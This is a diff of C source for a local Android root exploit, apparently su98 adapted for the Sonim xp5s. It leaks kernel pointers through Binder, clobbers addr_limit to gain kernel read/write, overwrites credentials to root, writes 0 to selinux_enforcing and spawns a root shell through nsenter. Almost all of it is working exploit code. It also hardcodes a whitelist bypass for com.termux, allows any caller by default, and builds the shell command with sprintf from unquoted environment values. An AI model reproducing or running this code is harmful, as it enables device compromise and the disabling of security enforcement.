@@ -8,15 +8,17 @@
  *
  * October 2019
  *
- * Further modified by flipphoneguy
+ * Modified for Sonim xp5s by flipphoneguy
 */
 
-#define DELAY_USEC 200000
-
+// paths
+#define WHITELIST_PATH "/sdcard/root/whitelist.txt"
+#define DENIED_PATH "/sdcard/root/blacklist.txt"
+#define PACKAGES_LIST "/data/system/packages.list"
+#define MAX_PACKAGE_NAME 256
 // $ uname -a
 // Linux localhost 3.18.71-perf+ #1 SMP PREEMPT Tue Jul 17 14:44:34 KST 2018 aarch64
-//#define KERNEL_BASE 0xffffffc000080000ul
-#define KERNEL_BASE 0xffffffc000000000ul
+#define KERNEL_BASE 0xffffffc000080000ul
 #define OFFSET__thread_info__flags 0x000
 #define OFFSET__task_struct__stack 0x008
 #define OFFSET__cred__uid 0x004
@@ -25,14 +27,13 @@
 #define OFFSET__cred__cap_effective (OFFSET__cred__cap_permitted+0x008)
 #define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted+0x010)
 
-#define USER_DS 0x8000000000ul
 #define BINDER_SET_MAX_THREADS 0x40046205ul
 #define MAX_THREADS 3
 
 #define RETRIES 3
 
-#define PROC_KALLSYMS
-#define KALLSYMS_CACHING
+#define NO_PROC_KALLSYMS
+#undef KALLSYMS_CACHING
 #define KSYM_NAME_LEN 128
 
 //Not needed, but saved for future use; the offsets are for LGV20 LS998
@@ -46,7 +47,6 @@
 
 
 #define _GNU_SOURCE
-#include <libgen.h>
 #include <time.h>
 #include <stdbool.h>
 #include <sys/mman.h>
@@ -68,7 +68,7 @@
 #include <sys/un.h>
 #include <errno.h>
 
-#define MAX_PACKAGE_NAME 1024
+#define DELAY_USEC 500000
 
 #define MIN(x, y) ((x) < (y) ? (x) : (y))
 #define MAX(x, y) ((x) > (y) ? (x) : (y))
@@ -83,14 +83,10 @@
 #define PAGE 0x1000ul
 #define TASK_STRUCT_OFFSET_FROM_TASK_LIST 0xE8
 
-int quiet = 0;
+int quiet = 1;
 
-const char whitelist[] = "su98-whitelist.txt";
-const char denyfile[] = "su98-denied.txt";
 int have_kallsyms = 0;
 int kernel3 = 1;
-char* myPath;
-char* myName;
 
 struct kallsyms {
     unsigned long addresses;
@@ -124,7 +120,7 @@ void error(char* fmt, ...)
 }
 
 int isKernelPointer(unsigned long p) {
-    return p >= KERNEL_BASE && p<=0xFFFFFFFFFFFFFFFEul; 
+    return p >= KERNEL_BASE; 
 }
 
 unsigned long kernel_read_ulong(unsigned long kaddr);
@@ -297,7 +293,7 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
 
 int leak_data(void *leakBuffer, int leakAmount,
                unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
-               unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p)
+               unsigned long *task_struct_ptr_p, unsigned long *kstack_p)
 {
     unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST + 8;
     unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough
@@ -389,7 +385,7 @@ int leak_data(void *leakBuffer, int leakAmount,
         memcpy(&task_struct_ptr, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
         message("CHILD: task_struct_ptr = 0x%lx", task_struct_ptr);
 
-        if (!badPointer && (extraLeakAmount > 0 || task_struct_plus_8_p != NULL))
+        if (!badPointer && (extraLeakAmount > 0 || kstack_p != NULL))
         {
             unsigned long extra[6] = {
                 addr,
@@ -423,11 +419,11 @@ int leak_data(void *leakBuffer, int leakAmount,
             write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
             //hexdump_memory(extraLeakBuffer, (extraLeakAmount+15)/16*16);
         }
-        if (task_struct_plus_8_p != NULL)
+        if (kstack_p != NULL)
         {
             if (read(pipefd[0], dataBuffer, 8) != 8) {
                 childSuccess = 0;
-                error( "leaking second field of task_struct");
+                error( "leaking kstack");
             }
             message("CHILD: task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
             write(leakPipe[1], dataBuffer, 8);
@@ -480,10 +476,10 @@ int leak_data(void *leakBuffer, int leakAmount,
         }
     }
 
-    if (task_struct_plus_8_p != NULL)
+    if (kstack_p != NULL)
     {
-        if (read(leakPipe[0], task_struct_plus_8_p, 8) != 8) {
-            message( "PARENT: **fail** reading leaked task_struct at offset 8");
+        if (read(leakPipe[0], kstack_p, 8) != 8) {
+            message( "PARENT: **fail** reading leaked kstack");
             success = 0;
             goto DONE;
         }
@@ -516,31 +512,6 @@ DONE:
     
     return success;
 }
-
-int leak_data_retry(void *leakBuffer, int leakAmount,
-               unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
-               unsigned long *task_struct_ptr_p, unsigned long *task_struct_plus_8_p) {
-    int try = 0;
-    while (try < RETRIES && !leak_data(leakBuffer, leakAmount, extraLeakAddress, extraLeakBuffer, extraLeakAmount, task_struct_ptr_p, task_struct_plus_8_p)) {
-        message("MAIN: **fail** retrying");
-        try++;
-    }
-    if (0 < try && try < RETRIES) 
-        message("MAIN: it took %d tries, but succeeded", try);
-    return try < RETRIES;        
-}
-
-int clobber_data_retry(unsigned long payloadAddress, const void *src, unsigned long payloadLength) {
-    int try = 0;
-    while (try < RETRIES && !clobber_data(payloadAddress, src, payloadLength)) {
-        message("MAIN: **fail** retrying");
-        try++;
-    }
-    if (0 < try && try < RETRIES) 
-        message("MAIN: it took %d tries, but succeeded", try);
-    return try < RETRIES;        
-}
-
 
 int kernel_rw_pipe[2];
 
@@ -630,50 +601,6 @@ void kernel_write_uchar(unsigned long kaddr, unsigned char data)
     kernel_write(kaddr, &data, sizeof(data));
 }
 
-// code from DrZener 
-unsigned long findSelinuxEnforcingFromAvcDenied(unsigned long avc_denied_address)
-{
-    unsigned long address;
-    unsigned long selinux_enforcing_address;
-    bool adrp_found = 0;
-    for(address = avc_denied_address; address <= avc_denied_address + 0x60; address += 4)
-    {
-        unsigned int instruction = kernel_read_uint(address);
-        
-        if(!adrp_found)
-        {   
-            unsigned int instruction_masked = instruction;
-            instruction_masked >>= 24;
-            instruction_masked &= 0x9F;
-            if((instruction_masked ^ 0x90) == 0 )
-            {
-                selinux_enforcing_address = address;
-                unsigned int imm_hi, imm_lo, imm;
-                imm_hi = (instruction >> 5) &  0x7FFFF;
-                imm_lo = (instruction >> 29) & 3;
-                imm = ((imm_hi << 2) | imm_lo) << 12;
-                selinux_enforcing_address &= 0xFFFFFFFFFFFFF000;
-                selinux_enforcing_address += imm;
-                adrp_found = 1;
-            }
-        }
-        if (adrp_found)
-        {
-            unsigned int instruction_masked = instruction;
-            instruction_masked >>= 22;
-            instruction_masked &= 0x2FF;
-            if((instruction_masked ^ 0x2E5) == 0 )
-            {
-                unsigned int offset = ((instruction >> 10) & 0xFFF) << 2;
-                selinux_enforcing_address += offset;
-                message("selinux_enforcing address found");
-                return selinux_enforcing_address;
-            }
-        }
-    }
-    message("selinux_enforcing address not found");
-    return 0UL;
-}
 
 // Make the kallsyms module not check for permission to list symbol addresses
 int fixKallsymsFormatStrings(unsigned long start)
@@ -721,21 +648,15 @@ int fixKallsymsFormatStrings(unsigned long start)
 
                     if (!strcmp(fmt, "%pK %c %s\t[%s]\x0A"))
                     {
-                        message("MAIN: patching longer version at %lx", a);
-                        if (15 != raw_kernel_write(a, "%p %c %s\t[%s]\x0A", 15)) {
-                            message("MAIN: **fail** probably you have read-only const storage");
-                            return found;
-                        }
                         found++;
+                        kernel_write(a, "%p %c %s\t[%s]\x0A", 15);
+                        message("MAIN: patching longer version at %lx", a);
                     }
                     else if (!strcmp(fmt, "%pK %c %s\x0A"))
                     {
-                        message("MAIN: patching shorter version at %lx", a);
-                        if (15 != raw_kernel_write(a, "%p %c %s\x0A", 10)) {
-                            message("MAIN: **fail** probably you have read-only const storage");
-                            return found;
-                        }
                         found++;
+                        kernel_write(a, "%p %c %s\x0A", 10);
+                        message("MAIN: patching shorter version at %lx", a);
                     }
 
                     if (found >= 2)
@@ -770,10 +691,15 @@ int verifyCred(unsigned long cred_ptr) {
     return uid == getuid();
 }
 
-int getCredOffset(unsigned char* task_struct_data) {
+int getCredOffset(unsigned char* task_struct_data, char* execName) {
     char taskname[16];
-    unsigned n = MIN(strlen(myName)+1, 16);
-    memcpy(taskname, myName, n);
+    char* p = strrchr(execName, '/');
+    if (p == NULL)
+        p = execName;
+    else
+        p++;
+    unsigned n = MIN(strlen(p)+1, 16);
+    memcpy(taskname, p, n);
     taskname[15] = 0; 
     
     for (int i=OFFSET__task_struct__stack+8; i<PAGE-16; i+=8) {
@@ -826,41 +752,31 @@ unsigned long countIncreasingEntries(unsigned long start) {
     } while(1);
 }
 
-int increasing(unsigned long* location, unsigned n) {
-    for (int i=0; i<n-1; i++)
-        if (location[i] > location[i+1])
-            return 0;
-    return 1;
-}
-
 int find_kallsyms_addresses(unsigned long searchStart, unsigned long searchEnd, unsigned long* startP, unsigned long* countP) {
     if (searchStart == 0)
         searchStart = KERNEL_BASE;
     if (searchEnd == 0)
-        searchEnd = searchStart + 0x5000000;
+        searchEnd = searchStart + 0x4000000;
     unsigned long foundStart = 0;
         
     unsigned char page[PAGE];
     for (unsigned long i=searchStart; i<searchEnd ; i+=PAGE) {
-        if (PAGE == raw_kernel_read(i, page, PAGE))
-            for (int j=0; j<PAGE; j+=0x100) {
-               if (isKernelPointer(*(unsigned long*)(page+j)) && increasing((unsigned long*)(page+j), 256/8-1)) {
-                    unsigned long count = countIncreasingEntries(i+j);
-                    if (count >= 40000) {
-                       *startP = i+j;
-                       *countP = count;
-                       return 1;
-                    }
-                    else if (count >= 10000) {
-                        message("MAIN: interesting, found a sequence of 10000 non-decreasing entries at 0x%lx", (i+j));
-                    }
-               }
-            }
+        kernel_read(i, page, PAGE);
+        for (int j=0; j<PAGE; j+=0x100) {
+           if (*(unsigned long*)(page+j)==KERNEL_BASE) {
+               unsigned long count = countIncreasingEntries(i+j);
+                if (count > 50000) {
+                   *startP = i+j;
+                   *countP = count;
+                   return 1;
+                }
+           }
+        }
     }
     return 0;
 }
 
-int get_kallsyms_name(unsigned long offset, char* name) {
+int get_kallsym_name(unsigned long offset, char* name) {
     unsigned char length = kernel_read_uchar(offset++);
     
     for (unsigned char i = 0; i < length ; i++) {
@@ -950,15 +866,13 @@ unsigned long findSymbol_memory_search(char* symbol) {
     
     unsigned long offset = kallsyms.names;
     char name[KSYM_NAME_LEN];
-    unsigned n = strlen(symbol);
     
     for(unsigned long i = 0; i < kallsyms.num_syms; i++) {
-        unsigned int n = get_kallsyms_name(offset, name);
-        if (!strncmp(name+1, symbol, n) && (name[1+n] == '.' || !name[1+n])) {
-            unsigned long address = kernel_read_ulong(kallsyms.addresses + i*8);
-            message( "MAIN: found %s in kernel memory at %lx", symbol, address);
+        unsigned int n = get_kallsym_name(offset, name);
+        if (!strcmp(name+1, symbol)) {
+            message( "found symbol in kernel memory", symbol);
             
-            return address;
+            return kernel_read_ulong(kallsyms.addresses + i*8);
         }
         offset += n;
     }
@@ -966,23 +880,29 @@ unsigned long findSymbol_memory_search(char* symbol) {
     return 0;
 }
 
-char* allocateSymbolCachePathName(char* symbol) {
-    int n = strlen(myPath);
+char* allocateSymbolCachePathName(char* execName, char* symbol) {
+    char* p = strrchr(execName, '/');
+    unsigned n;
+    if (p == NULL)
+        n = 0;
+    else
+        n = p-execName+1;
 
     char* pathname = malloc(strlen(symbol)+7+1+n);
     if (pathname == NULL) {
         errno = 0;
         error("allocating memory for pathname");
     }
-    strcpy(pathname, myPath);
+    strncpy(pathname, execName, n);
+    pathname[n] = 0;
     strcat(pathname, symbol);
     strcat(pathname, ".symbol");
 
     return pathname;
 }
 
-unsigned long findSymbol_in_cache(char* symbol) {
-    char* pathname = allocateSymbolCachePathName(symbol);
+unsigned long findSymbol_in_cache(char* execName, char* symbol) {
+    char* pathname = allocateSymbolCachePathName(execName, symbol);
     unsigned long address = 0;
     
     FILE *cached = fopen(pathname, "r");
@@ -996,10 +916,10 @@ unsigned long findSymbol_in_cache(char* symbol) {
     return address;
 }
 
-void cacheSymbol(char* symbol, unsigned long address) {
+void cacheSymbol(char* execName, char* symbol, unsigned long address) {
 #ifdef KALLSYMS_CACHING
-    if (address != 0 && address != findSymbol_in_cache(symbol)) {
-        char* pathname = allocateSymbolCachePathName(symbol);
+    if (address != 0 && address != findSymbol_in_cache(execName, symbol)) {
+        char* pathname = allocateSymbolCachePathName(execName, symbol);
         FILE *cached = fopen(pathname, "w");
         if (cached != NULL) {
             fprintf(cached, "%lx\n", address);
@@ -1014,17 +934,17 @@ void cacheSymbol(char* symbol, unsigned long address) {
 #endif
 }
     
-unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
+unsigned long findSymbol(char* execName, unsigned long pointInKernelMemory, char *symbol)
 {
     unsigned long address = 0;
     
 #ifdef KALLSYMS_CACHING    
-    address = findSymbol_in_cache(symbol);
+    address = findSymbol_in_cache(execName, symbol);
     if (address != 0)
         return address;
 #endif
     
-#ifndef PROC_KALLSYMS
+#ifdef NO_PROC_KALLSYMS
     address = findSymbol_memory_search(symbol);
 #else    
     char buf[1024];
@@ -1050,10 +970,9 @@ unsigned long findSymbol(unsigned long pointInKernelMemory, char *symbol)
         {
             unsigned long a;
             unsigned char type;
-            unsigned n = strlen(symbol);
             char sym[1024];
             sscanf(buf, "%lx %c %s", &a, &type, sym);
-            if (!strncmp(sym, symbol, n) && (sym[n]=='.' || !sym[n])) {
+            if (!strcmp(sym, symbol)) {
                 message( "found %s in /proc/kallsyms", sym);
                 address = a;
                 break;
@@ -1080,181 +999,127 @@ void checkKernelVersion() {
         else message("MAIN: detected kernel version other than 3");
 }
 
+
 void getPackageName(unsigned uid, char* packageName) {
-    if (uid == 2000) {
-        strcpy(packageName, "adb");
-        return;
-    }
-    else if (uid == 0) {
-        strcpy(packageName, "root");
-        return;
-    }
-    strcpy(packageName, "(unknown)");
-    FILE* f = fopen("/data/system/packages.list", "r");
-    if (f == NULL)
-        return;
-    unsigned id;
-    char pack[MAX_PACKAGE_NAME];
-    while(2 == fscanf(f, "%s %u%*[^\n]", pack, &id)) {
-        if (id == uid) {
-            strncpy(packageName, pack, MAX_PACKAGE_NAME);
-            packageName[MAX_PACKAGE_NAME-1] = 0;
-            goto DONE;
+    if (uid == 0) { strcpy(packageName, "root"); return; }
+    if (uid == 2000) { strcpy(packageName, "shell"); return; }
+    
+    strcpy(packageName, "unknown");
+    
+    FILE* f = fopen(PACKAGES_LIST, "r");
+    if (f == NULL) return;
+
+    char line[1024];
+    char name[MAX_PACKAGE_NAME];
+    unsigned int id;
+
+    while (fgets(line, sizeof(line), f)) {
+        if (sscanf(line, "%s %u", name, &id) == 2) {
+            if (id == uid) {
+                strncpy(packageName, name, MAX_PACKAGE_NAME);
+                packageName[MAX_PACKAGE_NAME-1] = 0;
+                break;
+            }
         }
     }
-DONE:
     fclose(f);
 }
 
-int checkWhitelist(unsigned uid) {    
-    if (uid == 0 || uid == 2000) 
-        return 1;
-    
-    char *path = alloca(strlen(myPath) + sizeof(whitelist));
-    strcpy(path, myPath);
-    strcat(path, whitelist);
+int checkWhitelist(unsigned uid) {
+    if (uid == 0 || uid == 2000) return 1;
 
-    FILE* wl = fopen(path, "r");
-    
-    if (wl == NULL) {
-        message("MAIN: no whitelist, so all callers are welcome");
-        return 1;
-    }
-    
     char parent[MAX_PACKAGE_NAME];
     getPackageName(uid, parent);
 
-    int allowed = 0;
-    
-    char line[512];
-    while (NULL != fgets(line, sizeof(line), wl)) {
-        line[sizeof(line)-1] = 0;
-        char* p = line;
-        while (*p && isspace(*p))
-            p++;
-        char*q = p + strlen(p) - 1;
-        while (p < q && isspace(*q)) 
-            *q-- = 0;
-        if (q <= p)
-            continue;
-        if (*q == '*') {
-            if (!strncmp(parent, p, q-p-1)) {
-                allowed = 1;
-                goto DONE;
+    if (!strcmp(parent, "com.termux")) {return 1;}
+
+    FILE *wl = fopen(WHITELIST_PATH, "r");
+    int strict_mode = 0;
+
+    if (wl != NULL) {
+        fseek(wl, 0, SEEK_END);
+        if (ftell(wl) > 0) {
+            strict_mode = 1;
+            rewind(wl);
+            
+            char line[512];
+            while (fgets(line, sizeof(line), wl)) {
+                char *p = line;
+                while (*p && isspace(*p)) p++;
+                char *q = p + strlen(p) - 1;
+                while (q > p && isspace(*q)) *q-- = 0;
+                
+                if (q <= p || *p == '#') continue;
+
+                if (*q == '*') {
+                    if (!strncmp(parent, p, q - p)) { 
+                        fclose(wl);
+                        return 1; 
+                    }
+                } else if (!strcmp(parent, p)) {
+                    fclose(wl);
+                    return 1; 
+                }
             }
         }
-        else if (!strcmp(parent,p)) {
-            allowed = 1;
-            goto DONE;
+        fclose(wl);
+    }
+
+    if (strict_mode) {
+        message("MAIN: denied by strict whitelist: %s", parent);
+        return 0;
+    }
+
+    FILE *bl = fopen(DENIED_PATH, "r");
+    if (bl != NULL) {
+        char line[512];
+        while (fgets(line, sizeof(line), bl)) {
+            char *p = line;
+            while (*p && isspace(*p)) p++;
+            char *q = p + strlen(p) - 1;
+            while (q > p && isspace(*q)) *q-- = 0;
+
+            if (q <= p || *p == '#') continue;
+
+            if (*q == '*') {
+                if (!strncmp(parent, p, q - p)) {
+                    fclose(bl);
+                    message("MAIN: denied by blacklist: %s", parent);
+                    return 0; 
+                }
+            } else if (!strcmp(parent, p)) {
+                fclose(bl);
+                message("MAIN: denied by blacklist: %s", parent);
+                return 0; 
+            }
         }
+        fclose(bl);
     }
 
-DONE:
-    fclose(wl);
-    
-    if (allowed)
-        message("MAIN: whitelist allows %s", parent);
-    else {
-        if (parent[0]) {
-            char *path = alloca(strlen(myPath) + sizeof(denyfile));
-            strcpy(path, myPath);
-            strcat(path, denyfile);
-            FILE* f = fopen(path, "a");
-            if (f != NULL) {
-                fprintf(f, "%s\n", parent);
-                fclose(f);
-            }        
-        }
-    }
-    
-    return allowed;
+    message("MAIN: allowed (default): %s", parent);
+    return 1;
 }
 
-/* for devices with randomized thread_info location on stack: thanks to chompie1337 */
-unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
-    unsigned long kstack_data[16384/8];
-    
-    message("MAIN: parsing kernel stack to find thread_info");
-    if (!leak_data_retry(NULL, 0, kstack, kstack_data, sizeof(kstack_data), NULL, NULL)) 
-        error("Cannot leak kernel stack");
-    
-    for (unsigned int pos = 0; pos < sizeof(kstack_data)/8; pos++)
-        if (kstack_data[pos] == USER_DS)
-            return kstack+pos*8-8;
-        
-    return 0;
-}
 
-unsigned long find_selinux_enforcing(unsigned long search_base) {
-    unsigned long address = findSymbol(search_base, "selinux_enforcing");
-    if (address == 0) {
-        message("MAIN: direct search didn't work, so searching via avc_denied");
-        address = findSymbol(search_base, "avc_denied");
-        if (address == 0)
-            return 0;
-        address = findSelinuxEnforcingFromAvcDenied(address);
-    }
-    return address;
-}
+
 
 int main(int argc, char **argv)
 {
-    int command = 0;
-    int dump = 0;
-    int rejoinNS = 1;
-    
-    char result[PATH_MAX];
-    ssize_t count = readlink("/proc/self/exe", result, PATH_MAX);
-    char* p = strrchr(result, '/');
-    if (p == NULL)
-        p = result;
-    else
-        p++;
-    *p = 0;
-    myPath = result;
 
-    p = strrchr(argv[0], '/');
-    if (p == NULL)
-        p = argv[0];
-    else
-        p++;
-    
-    myName = p;
-    int n = p-argv[0];
-    
-    if (!strcmp(myName,"su")) {
-        quiet = 1;
-    }        
-    
-    while(argc >= 2 && argv[1][0] == '-') {
-        switch(argv[1][1]) {
-            case 'q':
-                quiet = 1;
-                break;
-            case 'v':
-                puts("su98 version 0.01");
-                exit(0);
-                break;
-            case 'c':
-                command = 1;
-                quiet = 1;
-                break;
-            case 'd':
-                dump = 1;
-                break;
-            case 'N':
-                rejoinNS = 0;
-                break;
-            default:
-                break;
+    unsigned int oldUID = getuid();
+    if (argc >= 2) {
+        if (!strcmp(argv[1], "-v") || !strcmp(argv[1], "--verbose")) {
+            quiet = 0;
+            for (int i=1; i<argc-1; i++)
+                argv[i] = argv[i+1];
+            argc--;
         }
-        for (int i=1; i<argc-1; i++)
-            argv[i] = argv[i+1];
-        argc--;
     }
-    
-    if (!dump && argc >= 2)
-        quiet = 1;
+
+    if (argc >=2 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
+        printf("Usage: sud [OPTIONS] [COMMAND...]\nExamples:\n  sud: pop out default shell rooted with selinux disabled\n  sud -v | --verbose: Same but verbose output\n  sud -s bash: specify shell interpreter. default is $SHELL (usually bash)\n  sud -c id: run id as root and exit (like sudo)\n  sud id: same\n  sud -h | --help: print this help mesrage and exit\n");
+        exit(0);
+    }
     
     checkKernelVersion();
 
@@ -1266,93 +1131,50 @@ int main(int argc, char **argv)
     binder_fd = open("/dev/binder", O_RDONLY);
     epfd = epoll_create(1000);
 
-    unsigned long task_struct_plus_8 = 0xDEADBEEFDEADBEEFul;
+    unsigned long kstack = 0xDEADBEEFDEADBEEFul;
     unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
-
-    if (!leak_data_retry(NULL, 0, 0, NULL, 0, &task_struct_ptr, &task_struct_plus_8)) {
+    int try = 0;
+    while (try < RETRIES && !leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack)) {
+        message("MAIN: **fail** retrying");
+        try++;
+    }
+    if (try == RETRIES) {
         error("Failed to leak data");
     }
-
-    unsigned long thread_info_ptr;
+    else if (try > 0) {
+        message("MAIN: took %d tries but did it", try);
+    }
     
-    if (task_struct_plus_8 == USER_DS) {
-        message("MAIN: thread_info is in task_struct");
-        thread_info_ptr = task_struct_ptr;
-    }
-    else {
-        message("MAIN: thread_info should be in stack");
-        thread_info_ptr = find_thread_info_ptr_kernel3(task_struct_plus_8);
-        if (thread_info_ptr  == 0)
-            error("cannot find thread_info on kernel stack");
-    }
+    unsigned long thread_info_ptr = kernel3 ? kstack : task_struct_ptr;
     
     message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
-    message("MAIN: thread_info_ptr = %lx", (unsigned long)thread_info_ptr);
+    if (kernel3) 
+        message("MAIN: stack = %lx", kstack);
     message("MAIN: Clobbering addr_limit");
     unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
 
-    if (!clobber_data_retry(thread_info_ptr + 8, &src, 8)) {
+    try = 0;
+    while(try < RETRIES && !clobber_data(thread_info_ptr + 8, &src, 8)) {
+        message("MAIN: **fail** retrying");
+        try++;
+    }
+    if (try == RETRIES) {
         error("Failed to clobber addr_limit");
+    }
+    else if (try > 0) {
+        message("MAIN: took %d tries but did it", try);
     }
 
     message("MAIN: thread_info = 0x%lx", thread_info_ptr);
 
     setbuf(stdout, NULL);
     message("MAIN: should have stable kernel R/W now");
-    
-    if (dump) {
-        unsigned long start, count;
-        start = 0xffffffc000000000ul;
-        count = 0x1000;
-        
-        if (argc >= 2) 
-            sscanf(argv[1], "%lx", &start);
-
-        start &= ~7;
-
-        if (argc >= 3)
-            sscanf(argv[2], "%lx", &count);
-        unsigned long search = 0;
-        
-        int emit = 0;
-        
-        if (argc >= 4)
-            sscanf(argv[3], "%lx", &search);
-        else
-            emit = 1;
-        
-        unsigned char page[PAGE];
-        for (unsigned long i=start; i<start+count ; i+=PAGE) {
-            kernel_read(i, page, PAGE);
-            if (!emit) {
-                for (int j=0; j<PAGE; j+=8) {
-                   if (*(unsigned long*)(page+j)==search) {
-                       emit = 1;
-                       break;
-                   }
-                }
-            }
-            if (emit) {
-                printf("%lx:\n", i);
-                unsigned long n = start+count-i;
-                if (n>=PAGE) {
-                    n = PAGE;
-                }
-                else {
-                    n = (n+15)/16*16;
-                }
-                hexdump_memory(page, n);
-            }
-        }
-        exit(0);
-    }
-
 
     message("MAIN: searching for cred offset in task_struct");
     unsigned char task_struct_data[PAGE+16];
     kernel_read(task_struct_ptr, task_struct_data, PAGE);
         
-    unsigned long offset_task_struct__cred = getCredOffset(task_struct_data);
+    unsigned long offset_task_struct__cred = getCredOffset(task_struct_data, argv[0]);
     
     unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr + offset_task_struct__cred);
 
@@ -1367,11 +1189,8 @@ int main(int argc, char **argv)
     message("MAIN: search_base = %lx", search_base);
     
     message("MAIN: searching for selinux_enforcing");
-    unsigned long selinux_enforcing = find_selinux_enforcing(search_base);
-    
-//    unsigned long selinux_enabled = findSymbol(search_base, "selinux_enabled");
-
-    unsigned int oldUID = getuid();
+    unsigned long selinux_enforcing = findSymbol(argv[0], search_base, "selinux_enforcing");
+//    unsigned long selinux_enabled = findSymbol(argv[0], search_base, "selinux_enabled");
 
     message("MAIN: setting root credentials with cred offset %lx", offset_task_struct__cred);
     
@@ -1411,59 +1230,15 @@ int main(int argc, char **argv)
             message("MAIN: SECCOMP status %d", prctl(PR_GET_SECCOMP));
         }
     }
-    
-    unsigned prev_selinux_enforcing = 1;
 
     if (selinux_enforcing == 0)
         message("MAIN: **FAIL** did not find selinux_enforcing symbol");
     else
     {
-        prev_selinux_enforcing = kernel_read_uint(selinux_enforcing);
         kernel_write_uint(selinux_enforcing, 0);
         message("MAIN: disabled selinux enforcing");
         
-        cacheSymbol("selinux_enforcing", selinux_enforcing);
-    }
-    
-    if (rejoinNS) {
-        char cwd[1024];
-        getcwd(cwd, sizeof(cwd));
-
-        message("MAIN: re-joining init mount namespace");
-        int fd = open("/proc/1/ns/mnt", O_RDONLY);
-
-        if (fd < 0) {
-            error("open");
-            exit(1);
-        }
-
-        if (setns(fd, CLONE_NEWNS) < 0) {
-            message("MAIN: **partial failure** could not rejoin init fs namespace");
-        }
-
-        message("MAIN: rejoining init net namespace");
-
-        fd = open("/proc/1/ns/net", O_RDONLY);
-
-        if (fd < 0) {
-            error("open");
-        }
-
-        if (setns(fd, CLONE_NEWNET) < 0) {
-            message("MAIN: **partial failure** could not rejoin init net namespace");
-        }    
-        
-        chdir(cwd);
-    }
-    
-    if (!checkWhitelist(oldUID)) {
-        if (0 != selinux_enforcing) {
-            kernel_write_uint(selinux_enforcing, prev_selinux_enforcing);
-        }
-        errno = 0;
-        error("Whitelist check failed");
-    }
-    
+    cacheSymbol(argv[0], "selinux_enforcing", selinux_enforcing);
     message("MAIN: root privileges ready");
         
 /* process hangs if these are done */        
@@ -1472,14 +1247,82 @@ int main(int argc, char **argv)
 //        kernel_write_uint(security_ptr+4, 1310);
 //        for (int i=0; i<6; i++)
 //           message("SID %u : ", kernel_read_uint(security_ptr + 4 * i));  
+    }
 
-    if (command || argc == 2) {
-        execlp("sh", "sh", "-c", argv[1], (char *)0);
+    if (!checkWhitelist(oldUID)) {
+        if (selinux_enforcing != 0) {
+            // Restore SELinux to Enforcing (1) to be safe
+            kernel_write_uint(selinux_enforcing, 1); 
+        }
+        errno = 0;
+        error("Whitelist check failed");
+    }
+
+
+    if (argc >= 2 && argv[1][0] == '-') {
+        if (!strcmp(argv[1], "-dump") && argc >= 4) {
+            unsigned long start, count;
+            sscanf(argv[2], "%lx", &start);
+            start &= ~7;
+            sscanf(argv[3], "%lx", &count);
+            unsigned long startValue = 0;
+            int dump = 0;
+            if (argc >= 5)
+                sscanf(argv[4], "%lx", &startValue);
+            else
+                dump = 1;
+                
+            unsigned char page[PAGE];
+            for (unsigned long i=start; i<start+count ; i+=PAGE) {
+                kernel_read(i, page, PAGE);
+                if (!dump) {
+                    for (int j=0; j<PAGE; j+=8) {
+                       if (*(unsigned long*)(page+j)==startValue) {
+                           dump = 1;
+                           break;
+                       }
+                    }
+                }
+                if (dump) {
+                    printf("%lx:\n", i);
+                    hexdump_memory(page, PAGE);
+                }
+            }
+            exit(0);
+        }
+    }
+/*
+    execlp("nsenter", "nsenter", "-t", "1", (char*)0);
+    char *cmd;
+    if (argc == 3 && strcmp(argv[1], "-c")) {cmd = argv[2];}
+    else if (argc == 2) {cmd = argv[1];}
+    if (cmd)
+    {
+        execlp("sh", "sh", "-c", cmd, (char *)0);
     }
     else {
-        message("MAIN: popping out root shell");
-        execlp("sh", "sh", (char*)0);
+*/
+
+    message("MAIN: popping out root shell");
+    //execlp("sh", "sh", (char*)0);
+    char _cwd[1024];
+    getcwd(_cwd, 1024);
+    char *_path = getenv("PATH");
+    char *_term = getenv("TERM");
+    char *_home = getenv("HOME");
+    char *_shell = getenv("SHELL");
+    if (argc >=3 && !strcmp(argv[1], "-s")) {
+        _shell = argv[2];
+        for (int i=1; i<argc-1; i++) argv[i] = argv[i+1];
+        argc--; argc--;
     }
+    char cmd[4096];
+    sprintf(cmd, "cd %s && exec /system/bin/env PATH=%s TERM=%s HOME=%s %s",
+        _cwd,_path ? _path : "system/bin",_term ? _term : "xterm",_home ? _home : "/data/local/tmp",_shell ? _shell : "/system/bin/sh"
+    );
+    if (argc == 2) {strcpy(cmd, argv[1]);}
+    else if (argc == 3 && !strcmp(argv[1], "-c")) {strcpy(cmd, argv[2]);}
+    execlp("nsenter","nsenter","-t","1","-m","sh","-c",cmd,(char*)0);
 
     exit(0);
 }
